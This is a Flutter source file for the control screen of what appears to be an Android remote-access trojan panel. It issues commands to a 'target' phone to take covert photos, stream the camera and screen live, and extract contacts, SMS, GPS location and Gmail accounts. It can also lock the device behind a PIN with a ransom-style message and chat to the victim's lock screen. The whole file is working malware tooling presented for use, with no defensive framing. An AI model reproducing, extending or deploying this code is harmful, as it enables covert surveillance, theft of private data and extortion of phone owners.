import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import '../theme.dart';
import '../api.dart';
import '../widgets/neon_button.dart';

class ControlScreen extends StatefulWidget {
  final Map<String, dynamic> device;
  const ControlScreen({super.key, required this.device});

  @override
  State<ControlScreen> createState() => _ControlScreenState();
}

class _ControlScreenState extends State<ControlScreen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  late String _id;
  bool _sending = false;
  final _log = <String>[];

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  int _fps = 0;
  int _frames = 0;
  DateTime _fpsStart = DateTime.now();

  final _chat = <Map<String, String>>[];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    _id = widget.device['id']?.toString() ?? 'unknown';
    _chatTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    super.dispose();
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}] $m');
      if (_log.length > 30) _log.removeLast();
    });
  }

  void _toast(String m) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(m), duration: const Duration(seconds: 2)),
    );
  }

  Future<void> _cmd(String cmd, {String extra = ''}) async {
    if (_sending) return;
    setState(() => _sending = true);
    try {
      await Api.post(
        '/api/send-command',
        body: {'id': _id, 'command': cmd, 'extra': extra},
      );
      _addLog('Sent: $cmd');
      _toast('Command sent');
    } catch (e) {
      _addLog('Err: $e');
      _toast('Failed');
    } finally {
      if (mounted) setState(() => _sending = false);
    }
  }

  Future<void> _pollResponse(String cmd) async {
    for (var i = 0; i < 25; i++) {
      await Future.delayed(const Duration(seconds: 1));
      if (!mounted) return;
      try {
        final d = await Api.get('/api/get-response/$_id');
        if (d['data'] != null && d['cmd'] == cmd) {
          _onResponse(cmd, d['data']);
          return;
        }
      } catch (_) {}
    }
    _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic data) {
    if (!mounted) return;
    if (cmd == 'take_photo' || cmd == 'get_screen') {
      final b = data['image_base64']?.toString() ?? '';
      if (b.isEmpty) return;
      _showImage(b, cmd == 'take_photo' ? 'Photo' : 'Screen');
    } else if (cmd == 'get_location') {
      _showText('Location', '${data['lat']}, ${data['lng']}');
    } else if (cmd == 'get_contacts') {
      final l = data['contacts'] as List? ?? [];
      _showList('Contacts', l.map((c) => '${c['name']} — ${c['number']}').toList());
    } else if (cmd == 'get_sms') {
      final l = data['sms'] as List? ?? [];
      _showList('SMS', l.map((s) => '${s['address']}: ${s['body']}').toList());
    } else if (cmd == 'get_gmails') {
      _showText('Accounts', data['accounts']?.toString() ?? '-');
    }
  }

  void _showImage(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: T.bg,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: BorderSide(color: T.red.withOpacity(0.5)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(14),
                child: Text(
                  title,
                  style: const TextStyle(
                    fontFamily: T.mono,
                    color: T.white,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
              ClipRRect(
                borderRadius:
                    const BorderRadius.vertical(bottom: Radius.circular(16)),
                child: Image.memory(bytes, fit: BoxFit.contain),
              ),
            ],
          ),
        ),
      );
    } catch (_) {
      _toast('Decode failed');
    }
  }

  void _showText(String title, String body) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: T.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: T.border),
        ),
        title: Text(
          title,
          style: const TextStyle(fontFamily: T.mono, color: T.white),
        ),
        content: SelectableText(
          body,
          style: const TextStyle(
            fontFamily: T.mono,
            color: T.red,
            fontSize: 12,
          ),
        ),
      ),
    );
  }

  void _showList(String title, List<String> items) {
    showModalBottomSheet(
      context: context,
      backgroundColor: T.card,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.92,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            const SizedBox(height: 12),
            Text(
              '$title (${items.length})',
              style: const TextStyle(
                fontFamily: T.mono,
                color: T.red,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                itemCount: items.length,
                separatorBuilder: (_, __) =>
                    const Divider(color: T.border, height: 1),
                itemBuilder: (_, i) => ListTile(
                  title: Text(
                    items[i],
                    style: const TextStyle(color: T.white, fontSize: 12),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _startLive(String mode, String side) async {
    await _cmd(mode, extra: side);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _frames = 0;
      _fps = 0;
      _fpsStart = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 120), (_) async {
      if (!_liveOn || !mounted) return;
      try {
        final d = await Api.get('/api/live-frame/$_id');
        final raw = (d['frame'] ?? '').toString();
        if (raw.isEmpty) return;
        final clean = raw.contains(',') ? raw.split(',').last : raw;
        final bytes = base64Decode(clean);
        setState(() {
          _frame = bytes;
          _frames++;
          final ms = DateTime.now().difference(_fpsStart).inMilliseconds;
          if (ms >= 1000) {
            _fps = (_frames * 1000 / ms).round();
            _frames = 0;
            _fpsStart = DateTime.now();
          }
        });
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) {
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    }
    _cmd('live_stop');
  }

  Future<void> _pollChat() async {
    try {
      final d = await Api.get('/api/lock-chat/$_id');
      final msgs = (d['messages'] as List? ?? []);
      if (msgs.length != _chat.length && mounted) {
        setState(() {
          _chat.clear();
          for (final m in msgs) {
            _chat.add({
              'from': m['from']?.toString() ?? '',
              'text': m['text']?.toString() ?? '',
              'time': m['time']?.toString() ?? '',
            });
          }
        });
        _scrollChat();
      }
    } catch (_) {}
  }

  Future<void> _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() {
      _chat.add({
        'from': 'panel',
        'text': text.trim(),
        'time': TimeOfDay.now().format(context),
      });
    });
    _scrollChat();
    try {
      await Api.post(
        '/api/lock-chat/$_id',
        body: {'from': 'panel', 'text': text.trim()},
      );
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  void _inputDialog(
    String title,
    String label,
    Function(String) onDone, {
    bool num = false,
  }) {
    final c = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: T.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: const BorderSide(color: T.border),
        ),
        title: Text(
          title,
          style: const TextStyle(fontFamily: T.mono, color: T.white),
        ),
        content: TextField(
          controller: c,
          keyboardType: num ? TextInputType.number : TextInputType.text,
          style: const TextStyle(color: T.white),
          decoration: InputDecoration(
            labelText: label,
            labelStyle: const TextStyle(color: T.dim),
            filled: true,
            fillColor: T.bg,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: T.border),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('CANCEL', style: TextStyle(color: T.dim)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: T.red),
            onPressed: () {
              Navigator.pop(context);
              onDone(c.text.trim());
            },
            child: const Text('SEND', style: TextStyle(color: T.white)),
          ),
        ],
      ),
    );
  }

  Widget _header(String title, String sub) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          title,
          style: const TextStyle(
            fontFamily: T.mono,
            color: T.red,
            fontSize: 15,
            letterSpacing: 2,
            fontWeight: FontWeight.bold,
          ),
        ),
        const SizedBox(height: 6),
        Text(
          sub,
          style: const TextStyle(
            fontFamily: T.ui,
            color: T.dim,
            fontSize: 11,
          ),
        ),
        const SizedBox(height: 10),
        Container(width: 50, height: 2, color: T.red),
      ],
    );
  }

  Widget _pageLive() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _header('LIVE STREAM', 'Real-time camera & screen'),
        const SizedBox(height: 16),
        Container(
          height: _liveOn ? 220 : 90,
          decoration: BoxDecoration(
            color: const Color(0xFF050505),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: _liveOn ? T.red.withOpacity(0.6) : T.border,
            ),
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(15),
            child: _liveOn && _frame != null
                ? Image.memory(_frame!, gaplessPlayback: true, fit: BoxFit.contain)
                : Center(
                    child: Text(
                      _liveOn ? 'Waiting...' : 'Inactive',
                      style: const TextStyle(
                        fontFamily: T.mono,
                        color: T.dim,
                        fontSize: 12,
                      ),
                    ),
                  ),
          ),
        ),
        if (_liveOn)
          Padding(
            padding: const EdgeInsets.only(top: 8),
            child: Text(
              '$_fps FPS',
              style: const TextStyle(
                fontFamily: T.mono,
                color: T.red,
                fontSize: 11,
              ),
            ),
          ),
        const SizedBox(height: 16),
        NeonBtn(
          label: 'FRONT CAMERA',
          icon: Icons.camera_front_rounded,
          color: T.red,
          onTap: () => _startLive('live_camera_start', 'front'),
        ),
        NeonBtn(
          label: 'BACK CAMERA',
          icon: Icons.camera_rear_rounded,
          color: T.red,
          onTap: () => _startLive('live_camera_start', 'back'),
        ),
        NeonBtn(
          label: 'SCREEN STREAM',
          icon: Icons.desktop_windows_rounded,
          color: T.white,
          onTap: () => _startLive('live_screen_start', ''),
        ),
        if (_liveOn)
          NeonBtn(
            label: 'STOP LIVE',
            icon: Icons.stop_rounded,
            color: T.red,
            onTap: _stopLive,
          ),
      ],
    );
  }

  Widget _pageCamera() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _header('CAMERA', 'Visual control'),
        const SizedBox(height: 16),
        NeonBtn(
          label: 'TAKE PHOTO (BACK)',
          icon: Icons.camera_alt_rounded,
          color: T.red,
          onTap: () {
            _cmd('take_photo', extra: 'back');
            _pollResponse('take_photo');
          },
        ),
        NeonBtn(
          label: 'TAKE PHOTO (FRONT)',
          icon: Icons.camera_front_rounded,
          color: T.red,
          onTap: () {
            _cmd('take_photo', extra: 'front');
            _pollResponse('take_photo');
          },
        ),
        NeonBtn(
          label: 'SCREENSHOT',
          icon: Icons.screenshot_monitor,
          color: T.white,
          onTap: () {
            _cmd('get_screen');
            _pollResponse('get_screen');
          },
        ),
        NeonBtn(
          label: 'SET WALLPAPER',
          icon: Icons.wallpaper_rounded,
          color: T.red,
          onTap: () => _inputDialog(
            'Wallpaper',
            'Image URL',
            (v) => _cmd('set_wallpaper', extra: v),
          ),
        ),
      ],
    );
  }

  Widget _pageIntel() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _header('INTELLIGENCE', 'Extract data'),
        const SizedBox(height: 16),
        NeonBtn(
          label: 'CONTACTS',
          icon: Icons.contacts_rounded,
          color: T.red,
          onTap: () {
            _cmd('get_contacts');
            _pollResponse('get_contacts');
          },
        ),
        NeonBtn(
          label: 'GPS LOCATION',
          icon: Icons.my_location_rounded,
          color: T.red,
          onTap: () {
            _cmd('get_location');
            _pollResponse('get_location');
          },
        ),
        NeonBtn(
          label: 'GMAIL & ACCOUNTS',
          icon: Icons.account_circle_rounded,
          color: T.white,
          onTap: () {
            _cmd('get_gmails');
            _pollResponse('get_gmails');
          },
        ),
        NeonBtn(
          label: 'SMS INBOX',
          icon: Icons.sms_rounded,
          color: T.red,
          onTap: () {
            _cmd('get_sms');
            _pollResponse('get_sms');
          },
        ),
      ],
    );
  }

  Widget _pageAudio() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _header('AUDIO & NETWORK', 'Control audio / network'),
        const SizedBox(height: 16),
        NeonBtn(
          label: 'PLAY AUDIO URL',
          icon: Icons.play_circle_rounded,
          color: T.red,
          onTap: () => _inputDialog(
            'Play Audio',
            'MP3 URL',
            (v) => _cmd('play_audio', extra: v),
          ),
        ),
        NeonBtn(
          label: 'STOP AUDIO',
          icon: Icons.stop_circle_rounded,
          color: T.white,
          onTap: () => _cmd('stop_audio'),
        ),
        NeonBtn(
          label: 'VIBRATE LOOP',
          icon: Icons.vibration_rounded,
          color: T.red,
          onTap: () => _cmd('vibrate_loop'),
        ),
        NeonBtn(
          label: 'OPEN URL',
          icon: Icons.open_in_browser,
          color: T.white,
          onTap: () => _inputDialog(
            'Open URL',
            'https://...',
            (v) => _cmd('open_url', extra: v),
          ),
        ),
      ],
    );
  }

  Widget _pageLock() {
    return Column(
      children: [
        Expanded(
          child: ListView(
            padding: const EdgeInsets.all(16),
            children: [
              _header('LOCK & CHAT', 'Blank screen & message'),
              const SizedBox(height: 16),
              NeonBtn(
                label: 'BLACK SCREEN LOCK',
                icon: Icons.lock_rounded,
                color: T.red,
                onTap: () {
                  _inputDialog(
                    'Lock Message',
                    'Message',
                    (msg) {
                      _inputDialog(
                        'PIN',
                        '4-digit',
                        (pin) {
                          _cmd(
                            'lock_live',
                            extra:
                                '${msg.isEmpty ? 'DEVICE LOCKED' : msg}|${pin.isEmpty ? '1234' : pin}',
                          );
                        },
                        num: true,
                      );
                    },
                  );
                },
              ),
              NeonBtn(
                label: 'HARD LOCK DEVICE',
                icon: Icons.lock_clock_rounded,
                color: T.red,
                onTap: () {
                  _inputDialog(
                    'Lock Message',
                    'Message',
                    (msg) {
                      _inputDialog(
                        'PIN',
                        '4-digit',
                        (pin) {
                          _cmd(
                            'hard_lock',
                            extra:
                                '${msg.isEmpty ? 'DEVICE LOCKED' : msg}|${pin.isEmpty ? '1234' : pin}',
                          );
                        },
                        num: true,
                      );
                    },
                  );
                },
              ),
              NeonBtn(
                label: 'UNLOCK DEVICE',
                icon: Icons.lock_open_rounded,
                color: T.white,
                onTap: () => _cmd('unlock'),
              ),
              const SizedBox(height: 20),
              _header('CHAT', 'Messages to target lock screen'),
              const SizedBox(height: 12),
              Container(
                height: 220,
                decoration: BoxDecoration(
                  color: T.card,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: T.border),
                ),
                child: _chat.isEmpty
                    ? const Center(
                        child: Text(
                          'No messages',
                          style: TextStyle(
                            fontFamily: T.mono,
                            color: T.dim,
                            fontSize: 11,
                          ),
                        ),
                      )
                    : ListView.builder(
                        controller: _chatScroll,
                        padding: const EdgeInsets.all(10),
                        itemCount: _chat.length,
                        itemBuilder: (_, i) {
                          final m = _chat[i];
                          final me = m['from'] == 'panel';
                          return Align(
                            alignment: me
                                ? Alignment.centerRight
                                : Alignment.centerLeft,
                            child: Container(
                              margin: const EdgeInsets.symmetric(vertical: 3),
                              padding: const EdgeInsets.symmetric(
                                horizontal: 12,
                                vertical: 8,
                              ),
                              constraints: BoxConstraints(
                                maxWidth:
                                    MediaQuery.of(context).size.width * 0.7,
                              ),
                              decoration: BoxDecoration(
                                color: me ? T.red.withOpacity(0.25) : T.surface,
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: me
                                      ? T.red.withOpacity(0.5)
                                      : T.border,
                                ),
                              ),
                              child: Text(
                                m['text'] ?? '',
                                style: const TextStyle(
                                  color: T.white,
                                  fontSize: 12,
                                ),
                              ),
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
        Container(
          padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
          decoration: const BoxDecoration(
            color: T.surface,
            border: Border(top: BorderSide(color: T.border)),
          ),
          child: Row(
            children: [
              Expanded(
                child: TextField(
                  controller: _chatCtrl,
                  style: const TextStyle(color: T.white),
                  decoration: InputDecoration(
                    hintText: 'Message...',
                    hintStyle: const TextStyle(color: T.dim),
                    filled: true,
                    fillColor: T.bg,
                    contentPadding: const EdgeInsets.symmetric(
                      horizontal: 14,
                      vertical: 10,
                    ),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(20),
                      borderSide: BorderSide.none,
                    ),
                  ),
                  onSubmitted: _sendChat,
                ),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: const BoxDecoration(
                    color: T.red,
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(
                    Icons.send_rounded,
                    color: T.white,
                    size: 18,
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _pageDevice() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _header('DEVICE', 'System control'),
        const SizedBox(height: 16),
        NeonBtn(
          label: 'RESTART DEVICE',
          icon: Icons.restart_alt_rounded,
          color: T.red,
          onTap: () => _cmd('reboot_device'),
        ),
        NeonBtn(
          label: 'WAKE UP TARGET',
          icon: Icons.wb_sunny_rounded,
          color: T.white,
          onTap: () => _cmd('force_open'),
        ),
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: T.bg,
      appBar: AppBar(
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, size: 18),
          onPressed: () {
            if (_liveOn) _stopLive();
            Navigator.pop(context);
          },
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              widget.device['model']?.toString() ?? 'Device',
              style: const TextStyle(
                fontFamily: T.mono,
                color: T.white,
                fontSize: 13,
              ),
            ),
            Text(
              _id,
              style: const TextStyle(
                fontFamily: T.mono,
                color: T.dim,
                fontSize: 9,
              ),
            ),
          ],
        ),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(44),
          child: TabBar(
            controller: _tabs,
            isScrollable: true,
            indicator:
                const UnderlineTabIndicator(borderSide: BorderSide(color: T.red)),
            labelColor: T.red,
            unselectedLabelColor: T.dim,
            labelStyle: const TextStyle(
              fontFamily: T.mono,
              fontSize: 10,
              letterSpacing: 1,
            ),
            tabs: const [
              Tab(text: 'LIVE'),
              Tab(text: 'CAMERA'),
              Tab(text: 'INTEL'),
              Tab(text: 'AUDIO'),
              Tab(text: 'LOCK'),
              Tab(text: 'DEVICE'),
            ],
          ),
        ),
      ),
      body: Column(
        children: [
          Container(
            height: 40,
            margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: T.card,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: T.border),
            ),
            child: _log.isEmpty
                ? const Center(
                    child: Text(
                      'Ready',
                      style: TextStyle(
                        fontFamily: T.mono,
                        color: T.dim,
                        fontSize: 10,
                      ),
                    ),
                  )
                : ListView.builder(
                    itemCount: _log.length,
                    itemBuilder: (_, i) => Text(
                      _log[i],
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: const TextStyle(
                        fontFamily: T.mono,
                        color: T.red,
                        fontSize: 9,
                      ),
                    ),
                  ),
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _pageLive(),
                _pageCamera(),
                _pageIntel(),
                _pageAudio(),
                _pageLock(),
                _pageDevice(),
              ],
            ),
          ),
        ],
      ),
    );
  }
}